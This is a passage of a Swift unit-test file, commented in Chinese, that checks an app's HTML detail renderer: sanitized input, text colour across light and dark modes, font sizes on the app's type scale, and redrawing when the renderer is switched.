        XCTAssertNotEqual(source, htmlFixture, "喂给渲染器的必须是消毒后的那一份")
        XCTAssertEqual(source, HtmlSanitizer.renderableHTML(htmlFixture))
        XCTAssertEqual(HtmlSanitizer.residualFetchableReferences(source), [])
        // 渲染器真的画得出东西（不是 nil → 退回原文那条路）。
        let attr = HtmlRendering.attributedString(source)
        XCTAssertNotNil(attr)
        XCTAssertTrue(attr?.string.contains("季度报告") ?? false,
                      "属性串里没有正文 ⇒ 渲染其实失败了，而这条通道看起来是通的")
        XCTAssertFalse(attr?.string.contains("<h1>") ?? true, "标签字面量不该以正文出现")
    }

    /// 渲染出来的属性串里，**每一段有字的正文都必须带着一支跟着外观变的墨**（R335 看图腿量出来的缺陷）。
    ///
    /// 这一格被改写过一次，而那一改是承重的。第一版判的是"颜色属性一个都不许留"
    /// （`removeAttribute` 抹掉 WebKit 烤进来的固定色），它全绿，而帧上正文仍然是黑的 ——
    /// 因为抹掉之后那段字**没有颜色**，画它的是文本视图自己的默认墨，
    /// 而默认墨在这条离屏通道里解析成什么不是这份代码担保的。
    /// 现读（`/tmp/r335_shots/detail-html-rendered-720x520-dark.png`）：正文列里
    /// **8779 颗 RGB(0,0,0)** 落在 luma=30 的表面上 ⇒ 对比 **1.26:1**，同一卷里 Markdown 正文 12.27:1。
    /// 所以这一格问的是**结果**而不是**动作**：拿每一段的颜色在亮暗两档各解析一次，
    /// 两档同色（或干脆没有色）就是"这一段的墨不跟表面走"，红。
    func testRenderedHtmlInkFollowsTheAppearance() throws {
        let decision = DetailRenderPolicy.decide(text: htmlFixture, htmlPayload: nil)
        guard let (renderer, source) = decision.resolved(), renderer == .html else {
            return XCTFail("夹具没走 HTML 渲染器")
        }
        guard let attr = HtmlRendering.attributedString(source) else { return XCTFail("渲染返回 nil") }
        XCTAssertTrue(attr.length > 0)
        let full = NSRange(location: 0, length: attr.length)

        // 数的是"有真字的段里，墨不合格的那几段"（不是区段总数）：属性整个被移除时枚举只给一段
        // 值为 nil 的区间，"1 段"看着像"只有一小片有色"，其实是"全片无色"——第一版就被这个形状骗过。
        let after = inkAudit(attr)
        // 同一颗尺量"动手之前"：没有这一半，`applySurfaceInk` 改没改都测不出来（R68）。
        let before = inkAudit(HtmlRendering.parse(source))
        var links = 0
        attr.enumerateAttribute(.link, in: full) { v, _, _ in if v != nil { links += 1 } }
        let bodyLight = HtmlRendering.components(HtmlRendering.surfaceBodyInk, appearanceName: .aqua) ?? []
        let bodyDark = HtmlRendering.components(HtmlRendering.surfaceBodyInk, appearanceName: .darkAqua) ?? []
        let textChars = attr.string.trimmingCharacters(in: .whitespacesAndNewlines).count
        // 字族那一格是**读数**，不是判据（R335 看图腿问的是"这一列正文用谁的字"）：
        // Markdown 那条用产品的 `DetailTypography.bodyFont`（SF Mono 14），而 HTML 这条
        // 用 WebKit 给的那一份（作者没写 font-family 时它是衬线族）。两档不同是**设计**还是**漂了**，
        // 得先有数才能判 —— 所以这里只打，不红（判"不改"要绑读数，见 Skill 的六条硬规矩第 6 条）。
        var families: [String] = []
        var faces: [String] = []
        var sizes: [String] = []
        var boldRuns = 0, italicRuns = 0, plainRuns = 0
        attr.enumerateAttribute(.font, in: full) { v, r, _ in
            guard let font = v as? NSFont else { return }
            let text = (attr.string as NSString).substring(with: r)
            guard !text.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
            // 强调有没有活下来（R335 看图腿问的第二件事）：`<b>` / `<em>` 在 CJK 衬线下
            // 很容易被读成"和正文一样"，而那是**信息丢失**，不是风格差异。
            // 数三样：descriptor 的 symbolicTraits（粗与斜都在里面）、以及**面名**本身
            // （`Times-Roman` vs `Times-Bold` 这种 PostScript 名才是"这一段的字到底换了没"的证人 ——
            //  第一版想读 weight trait，`object(forAttribute:)` 在这个 SDK 上根本不存在的编译错把它拦下了）。
            let traits = font.fontDescriptor.symbolicTraits
            if traits.contains(.bold) { boldRuns += 1 }
            if traits.contains(.italic) { italicRuns += 1 }
            if !traits.contains(.bold), !traits.contains(.italic) { plainRuns += 1 }
            if !faces.contains(font.fontName) { faces.append(font.fontName) }
            // `familyName` 是可空的（这台机器的 SDK 上它就不是非可选）⇒ 缺族名时退回 PostScript 名，
            // 不许 `!`：这一格是读数，读不到就该说"读不到"，而不是让整卷崩在这里。
            let family = font.familyName ?? font.fontName
            if !families.contains(family) { families.append(family) }
            let size = "\(Int(font.pointSize.rounded()))pt"
            if !sizes.contains(size) { sizes.append(size) }
        }
        let productFont = DetailTypography.bodyFont
        CaptureReadings.emit("HTML_FONTS 族=\(families.joined(separator: "/")) 面=\(faces.joined(separator: "/")) "
            + "字号=\(sizes.joined(separator: "/")) "
            + "粗段=\(boldRuns) 斜段=\(italicRuns) 常规段=\(plainRuns) "
            + "产品正文族=\(productFont.familyName ?? productFont.fontName)/\(Int(DetailTypography.bodyFontSize))pt")
        CaptureReadings.emit("HTML_INK 字符=\(textChars) 烤死段前=\(before.baked) 烤死段后=\(after.baked) "
            + "无色段后=\(after.colorless) 烤死背景段=\(after.background) 链接段=\(links) "
            + "正文墨亮=\(bodyLight.description) 正文墨暗=\(bodyDark.description)")

        XCTAssertGreaterThan(before.baked, 0,
                             "「动手之前」量到 0 处烤死的墨 ⇒ 这一格没有对象：要么系统不烤色了（那要重写这条判据），"
                             + "要么夹具换了（那两帧会是同一张照片）")
        XCTAssertEqual(after.baked, 0, "属性串里还有「两档解析成同一个 RGB」的一段 ⇒ 换暗档它不会跟着变")
        XCTAssertEqual(after.colorless, 0,
                       "有一段正文没有颜色属性 ⇒ 画它的是视图自己的默认墨，而那条通道在这台机器上实测画成黑")
        XCTAssertEqual(after.background, 0,
                       "还留着页面自己的背景色 ⇒ 暗档表面上会出现一块比表面更亮的方块")
        XCTAssertGreaterThan(textChars, 40, "正文这么短 ⇒ 上面三条是空对账（R140）")
        XCTAssertGreaterThan(links, 0, "链接属性被顺手抹掉了 ⇒ 渲染态里 <a> 与正文长得一样，读不出可点")
        // 正文墨的**权威**必须是 Markdown 那条用的同一支：两支流派的墨不一样，
        // 用户切渲染器时看到的是"字变淡了"，而两种排版都"正确"。
        XCTAssertEqual(HtmlRendering.components(HtmlRendering.surfaceBodyInk, appearanceName: .aqua),
                       HtmlRendering.components(MarkdownPresentation.bodyColor, appearanceName: .aqua),
                       "HTML 正文墨与 Markdown 正文墨在亮档解析成不同 RGB ⇒ 两条渲染通道各立了一支")
        XCTAssertNotEqual(bodyLight, bodyDark,
                          "正文墨在两档解析成同一个数 ⇒ 它不跟外观走，这一族缺陷会原地复活")
    }

    /// HTML 渲染出来的正文**必须坐在产品那一档字号上**（R335 看图腿 + `HTML_FONTS` 现读）。
    ///
    /// 现读：`NSAttributedString(html:)` 给 `族=Times 字号=24pt/12pt`，而产品正文是
    /// `.AppleSystemUIFontMonospaced/14pt` ⇒ 同一个"渲染"档里两条通道差两号字，
    /// 用户点一下切换，正文从 12 跳到 14。这一族叫**同一档两种刻度**（R3 那一族是它的反面：
    /// 层级漂了，而这里漂的是基准）。R335 的做法是**等比搬到正文那一档**；R434 更正了后半句：
    /// 等比之后 h1 = 28pt，而同一份语义走 Markdown 渲染器时 h1 = 20pt —— 同一个「渲染」档里
    /// 两条通道的**标题**差 8pt。产品自己的梯子（`MarkdownPresentation.headingFontSize`）
    /// 才是这一档的权威，所以判据现在判两件事：
    /// ① 正文档 == `DetailTypography.bodyFontSize`；② **标题档落在 Markdown 的同一条梯子上**
    /// （老断言「层级比必须与浏览器一致」会把 24/12=2.0 钉成契约，那正是要修的不一致）。
    func testRenderedHtmlBodySitsOnTheAppTypeScale() throws {
        let decision = DetailRenderPolicy.decide(text: htmlFixture, htmlPayload: nil)
        guard let (renderer, source) = decision.resolved(), renderer == .html else {
            return XCTFail("夹具没走 HTML 渲染器")
        }
        guard let raw = HtmlRendering.parse(source),
              let attr = HtmlRendering.attributedString(source) else { return XCTFail("渲染返回 nil") }
        let baseBefore = HtmlRendering.fontBaseSize(raw)
        let baseAfter = HtmlRendering.fontBaseSize(attr)
        let headings = distinctSizes(attr).filter { $0 > baseAfter }.sorted(by: >)
        let ladder = (1...6).map { MarkdownPresentation.headingFontSize(level: $0) }
        let target = DetailTypography.bodyFontSize
        CaptureReadings.emit("HTML_TYPE 基准前=\(baseBefore)pt 基准后=\(baseAfter)pt 产品档=\(target)pt "
            + "标题后=\(headings.map { String(format: "%.1f", $0) }.joined(separator: ",")) "
            + "梯子=\(ladder.map { String(format: "%.1f", $0) }.joined(separator: ","))")
        XCTAssertGreaterThan(baseBefore, 0, "读不到正文档 ⇒ 下面三条全是空对账")
        XCTAssertNotEqual(baseBefore, target,
            "缩放之前基准就已经是产品档 ⇒ 这一格没有对象（要么系统改了默认字号，要么夹具换了）")
        XCTAssertEqual(baseAfter, target, accuracy: 0.01,
            "渲染出来的正文档没落在产品那一档：\(baseAfter)pt ≠ \(target)pt ⇒ 同一个「渲染」档两条通道两种刻度")
        XCTAssertFalse(headings.isEmpty, "渲染结果里没有比正文大的字号 ⇒ 标题被压平了")
        XCTAssertGreaterThan(headings.first ?? 0, baseAfter, "最大号不大于正文档 ⇒ 标题被压平了")
        XCTAssertEqual(headings.first ?? 0, ladder[0], accuracy: 0.01,
            "HTML 的 h1 没落到 Markdown 的 h1 那一档：\(headings.first ?? 0)pt ≠ \(ladder[0])pt")
        for size in headings {
            XCTAssertTrue(ladder.contains { abs($0 - size) < 0.01 },
                          "标题字号 \(size)pt 不在 Markdown 梯子 \(ladder) 上 ⇒ 同一档还在用两套刻度")
        }
    }

    /// 一份属性串里出现过的**不同**字号（按字符数加权只用于找基准，这里要的是集合）。
    private func distinctSizes(_ attr: NSAttributedString) -> [CGFloat] {
        let full = NSRange(location: 0, length: attr.length)
        var seen = Set<CGFloat>()
        attr.enumerateAttribute(.font, in: full) { value, range, _ in
            guard let font = value as? NSFont else { return }
            let text = (attr.string as NSString).substring(with: range)
            guard !text.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
            seen.insert(font.pointSize)
        }
        return Array(seen)
    }

    /// 作者写的固定色**在消毒那一步留着、在渲染那一步换掉**（R335 / D 待立的取舍）。
    ///
    /// 为什么要单独一格：`HtmlSanitizer` 保留 `color:#0a0`（它只管"能不能被加载"），
    /// 而 `HtmlRendering` 把它换成表面墨。少了一格断言，下一轮"顺手尊重作者颜色"的人
    /// 只会看到消毒器里那句"颜色留着"，而看不到这里是它被换掉的地方。
    func testAuthorFixedColorsAreReplacedAtRenderTime() throws {
        let source = "<p>正文一段</p><p style=\"color:#0a0\">作者指定的绿</p>"
        guard let attr = HtmlRendering.attributedString(HtmlSanitizer.renderableHTML(source)) else {
            return XCTFail("渲染返回 nil")
        }
        XCTAssertTrue(HtmlSanitizer.renderableHTML(source).contains("color:#0a0"),
                      "消毒器不该管墨 —— 它管的是可加载构造")
        let audit = inkAudit(attr)
        XCTAssertEqual(audit.baked, 0, "作者的固定绿被烤进了属性串 ⇒ 暗档读不到")
        let ns = attr.string as NSString
        XCTAssertTrue(ns.contains("作者指定的绿"))
        // 逐段核对：那一句拿到的是正文墨，不是 #0a0。
        let full = NSRange(location: 0, length: attr.length)
        var checked = 0
        attr.enumerateAttribute(.foregroundColor, in: full) { v, r, _ in
            guard let color = v as? NSColor else { return }
            let text = ns.substring(with: r)
            guard text.contains("作者指定的绿") else { return }
            checked += 1
            XCTAssertEqual(HtmlRendering.components(color, appearanceName: .aqua),
                           HtmlRendering.components(HtmlRendering.surfaceBodyInk, appearanceName: .aqua),
                           "这一段没有换成表面墨：\(color)")
        }
        XCTAssertEqual(checked, 1, "那一句话没被核对到 ⇒ 这一格是空对账（checked=\(checked)）")
        CaptureReadings.emit("HTML_AUTHCOLOR 核对段=\(checked) 换墨后烤死段=\(audit.baked)")
    }

    struct InkAudit {
        var baked = 0        // 有字、有色，但两档解析成同一个 RGB
        var colorless = 0    // 有字、没有颜色属性（画它的是视图默认墨）
        var background = 0   // 留着页面背景色的段
    }

    /// 一颗尺量两份产物（"动手前"与"动手后"必须同一颗，否则前后不可比）。
    private func inkAudit(_ attr: NSAttributedString?) -> InkAudit {
        var out = InkAudit()
        guard let attr = attr else { out.baked = -1; out.colorless = -1; out.background = -1; return out }
        let full = NSRange(location: 0, length: attr.length)
        let ns = attr.string as NSString
        func hasText(_ r: NSRange) -> Bool {
            !ns.substring(with: r).trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
        }
        attr.enumerateAttribute(.foregroundColor, in: full) { v, r, _ in
            guard hasText(r) else { return }
            guard let value = v, let color = value as? NSColor else {
                out.colorless += 1
                return
            }
            if HtmlRendering.resolvesIdenticallyInBothAppearances(color) { out.baked += 1 }
        }
        attr.enumerateAttribute(.backgroundColor, in: full) { v, r, _ in
            if v != nil, hasText(r) { out.background += 1 }
        }
        return out
    }

    /// 同一段字节换渲染器时，正文**必须真的重画**（R335 / 刀 M975 的靶）。
    ///
    /// 为什么单独一格：`updateRendered` 只在"键变了"时才重建属性串，而键的第一版只含源文本。
    /// 于是"字节没换、渲染器换了"被读成"没变" ⇒ 屏幕上那一次切换是**空操作**，
    /// 而它看起来完全像成功了（两种排版都在、控件标题也在换）。
    /// 这一格不拍帧：它问的是"写入口有没有把渲染器算进去"，直接问文本视图自己的属性最快。
    func testSwitchingRendererOnTheSameBytesRepaints() throws {
        // NSTextView 的可用初始化器要带 textContainer（这个子类没补便捷 init，
        // 而产品路径上它总是由 `readOnlyBodyScrollView` 装配出来的 —— 这里只要一个能写的存储）。
        // 三件套要自己搭：只给 container 而不给 storage 时 `textStorage` 是 nil，
        // 而写入口的第一行就是 `if …, let textStorage` —— 那种情况下这一格会绿得毫无意义。
        let storage = NSTextStorage()
        let layout = NSLayoutManager()
        storage.addLayoutManager(layout)
        let container = NSTextContainer(size: NSSize(width: 320, height: 200))
        layout.addTextContainer(container)
        let view = ChineseSelectableNSTextView(frame: NSRect(x: 0, y: 0, width: 320, height: 200),
                                               textContainer: container)
        XCTAssertNotNil(view.textStorage, "夹具没接上 textStorage ⇒ 这一格判不了任何东西")
        let bytes = "# 标题\n"
        _ = view.updateRendered(source: bytes, renderer: .markdown, highlightQuery: "")
        let afterMarkdown = view.attributedString().string
        _ = view.updateRendered(source: bytes, renderer: .html, highlightQuery: "")
        let afterHtml = view.attributedString().string
        XCTAssertTrue(afterMarkdown.contains("标题"), "Markdown 那一遍连正文都没画出来：\(afterMarkdown)")
        XCTAssertFalse(afterMarkdown.contains("#"), "Markdown 渲染态不该还剩着 # 字面量")
        XCTAssertTrue(afterHtml.contains("#"),
                      "HTML 把「# 标题」里的 # 也吃掉了 ⇒ 这一遍跑的其实还是 Markdown，缓存键又坏了")
        XCTAssertNotEqual(afterMarkdown, afterHtml,
                          "换了渲染器而正文一字未变 ⇒ 切换是空操作（缓存键没含渲染器身份）")
    }
}

private func elapsedMs(_ body: () -> Void) -> Double {
    let t0 = DispatchTime.now()
    body()
    return Double(DispatchTime.now().uptimeNanoseconds - t0.uptimeNanoseconds) / 1_000_000
}
